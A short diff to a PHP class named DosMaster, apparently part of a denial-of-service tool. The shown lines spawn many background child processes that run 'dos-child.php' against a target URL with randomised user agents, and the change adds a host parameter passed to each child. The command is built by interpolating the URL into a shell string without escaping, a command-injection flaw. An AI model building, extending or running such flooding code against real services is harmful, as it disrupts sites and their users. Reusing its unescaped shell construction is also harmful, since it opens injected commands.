@@ -16,6 +16,7 @@ class DosMaster
     private $childrenCnt = 50;
     private $requestsCnt = 10;
     private $secondsCnt = 0;
+    private $host = "0.0.0.0";
     private $logFolder = '';
     private $logFileName = '';
 
@@ -73,7 +74,7 @@ class DosMaster
                     break;
                 }
                 $userAgent = base64_encode($this->agents[rand(0, $acnt - 1)]);
-                $cmd = "cd " . __DIR__ . "; php dos-child.php {$url} {$userAgent}";
+                $cmd = "cd " . __DIR__ . "; php dos-child.php {$url} {$userAgent} {$this->host}";
                 // print "$cmd\n";
                 `$cmd >> {$this->logFolder}/{$this->logFileName} &`; // > /dev/null 2>/dev/null & - to not wait the response
             }
